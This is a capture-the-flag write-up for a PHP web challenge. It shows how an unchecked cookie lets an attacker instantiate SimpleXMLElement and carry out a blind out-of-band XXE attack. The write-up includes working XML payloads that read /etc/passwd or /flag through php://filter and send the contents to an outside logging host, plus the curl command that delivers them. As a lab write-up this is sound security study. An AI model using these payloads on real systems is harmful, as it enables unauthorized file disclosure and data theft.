# blind
Web

## Description:
> Hacking blind: http://35.207.132.47:82
> 
> Flag is at /flag

## Solution:

The contents of the website is:
```php
 <?php
  function __autoload($cls) {
    include $cls;
  }

  class Black {
    public function __construct($string, $default, $keyword, $store) {
      if ($string) ini_set("highlight.string", "#0d0d0d");
      if ($default) ini_set("highlight.default", "#0d0d0d");
      if ($keyword) ini_set("highlight.keyword", "#0d0d0d");

      if ($store) {
            setcookie('theme', "Black-".$string."-".$default."-".$keyword, 0, '/');
      }
    }
  }

  class Green {
    public function __construct($string, $default, $keyword, $store) {
      if ($string) ini_set("highlight.string", "#00fb00");
      if ($default) ini_set("highlight.default", "#00fb00");
      if ($keyword) ini_set("highlight.keyword", "#00fb00");

      if ($store) {
            setcookie('theme', "Green-".$string."-".$default."-".$keyword, 0, '/');
      }
    }
  }

  if ($_=@$_GET['theme']) {
    if (in_array($_, ["Black", "Green"])) {
      if (@class_exists($_)) {
        ($string = @$_GET['string']) || $string = false;
        ($default = @$_GET['default']) || $default = false;
        ($keyword = @$_GET['keyword']) || $keyword = false;

        new $_($string, $default, $keyword, @$_GET['store']);
      }
    }
  } else if ($_=@$_COOKIE['theme']) {
    $args = explode('-', $_);
    if (class_exists($args[0])) {
      new $args[0]($args[1], $args[2], $args[3], '');
    }
  } else if ($_=@$_GET['info']) {
    phpinfo();
  }

  highlight_file(__FILE__);

```

The first thing that leaps to the eye is that we are able to view the output of `phpinfo` by sending `?info=1`. However, I did not find anything interesting in the output.

The following code seems like the next place to invest efforts in:
```php
else if ($_=@$_COOKIE['theme']) {
  $args = explode('-', $_);
  if (class_exists($args[0])) {
    new $args[0]($args[1], $args[2], $args[3], '');
}
```

We can supply a class name in the cookie, and the code will instantiate the class for us, together with some user-provided parameters. The programmer intended for this to be used only with `Green` and `Black` classes, but we can provide any class we want (as long as it returns true for `class_exists`). 

One option is to try and perform a Blind XXE attack using the [SimpleXMLElement](http://php.net/manual/en/class.simplexmlelement.php) class. 

What's an XXE attack?
> An XML External Entity (XXE) attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts. ([source](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing))

This means, that we can create "entities" in the XML which are evaluated during runtime, instead of providing a static XML document. For example:

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
 ```

 If XML entity processing is allowed, this XML should output:
 ```xml
 <userInfo>
  <firstName>John</firstName>
  <lastName>Doe</lastName>
 </userInfo>
 ```

 Advanced features are available as well, such as the `SYSTEM` keyword, which allows, for example, to leak file content:
 ```xml
 <?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```


Now, the `SimpleXMLElement` class "Represents an element in an XML document", but the real beauty of it is hidden in the constructor:

> # SimpleXMLElement::__construct
> ## SimpleXMLElement::__construct — Creates a new SimpleXMLElement object 
> ```php
> final public SimpleXMLElement::__construct ( string $data [, int $options = 0 [, bool $data_is_url = FALSE [, string $ns = "" [, bool $is_prefix = FALSE ]]]] )
> ```
>  * data:    A well-formed XML string or the path or URL to an XML document if data_is_url is TRUE.
> * options: Optionally used to specify additional Libxml parameters. 
> * data_is_url: By default, data_is_url is FALSE. Use TRUE to specify that data is a path or URL to an XML document instead of string data. 
> * ...

Instead of providing an XML string, we can provide a URL which contains the XML. We just need to make sure that we provide the option of `LIBXML_NOENT` (2), which actually tells the function to "[substitute entities](https://stackoverflow.com/questions/29811915/external-entities-not-working-in-simplexml)" (as opposed to its name). 

We can find many different XXE payloads at the [PayloadAllTheThings page](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection). The one that worked for me is "**XXE OOB with DTD and PHP filter**":

```xml
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://127.0.0.1/dtd.xml">
%sp;
%param1;
]>
<r>&exfil;</r>

File stored on http://127.0.0.1/dtd.xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
```

### Step 1: Create Request-Inspector Endpoint:
Head to [RequestInspector](https://requestinspector.com) and create an endpoint. This will provide us with a URL such as `https://requestinspector.com/inspect/01d0fpjtce5cd5ae80menm0hyw`. Every time this URL is accessed, the complete request data (including full URI, headers and parameters) is logged to an interactive realtime log.

### Step 2: Create Secondary XML File:
Head to [PasteBin](https://pastebin.com) and paste the following:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://requestinspector.com/inspect/01d0fpjtce5cd5ae80menm0hyw?%data;'>">
```

Raw output will be available in a URI such as `https://pastebin.com/raw/AMFPkydv`.

This command tells the XML engine to take the contents of `/flag`, base64-encode it, and send it as a parameter to the request inspector URI.

### Step 3: Create Primary XML File:
Paste another XML file in PasteBin:
```xml
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "https://pastebin.com/raw/AMFPkydv">
%sp;
%param1;
]>
<r>&exfil;</r>
```

Raw output will be available in a URI such as `https://pastebin.com/raw/n23gK8ig`.

This command tells the XML engine to resolve and execute the other XML file.

### Step 4: Send the Cookie
Access the website with in order to instantiate the SimpleXMLElement element from the URI.

```console
curl --cookie "theme=SimpleXMLElement-https://pastebin.com/raw/n23gK8ig-2-true" http://35.207.132.47:82/
```

### Step 5: View the Request-Inspector Log:

The log shows:
```
GET /inspect/01d0fpjtce5cd5ae80menm0hyw?MzVjM19ldmVuX2FfYmxpbmRfc3F1aXJyZWxfZmluZHNfYV9udXRfbm93X2FuZF90aGVuCg== HTTP/1.1
requestinspector.com
Accept-Encoding: gzip
User-Agent: Go-http-client/1.1 
```

### Step 6: Decode the Flag:

The flag is base64 encoded
```
# echo MzVjM19ldmVuX2FfYmxpbmRfc3F1aXJyZWxfZmluZHNfYV9udXRfbm93X2FuZF90aGVuCg== | base64 -d
35c3_even_a_blind_squirrel_finds_a_nut_now_and_then
```

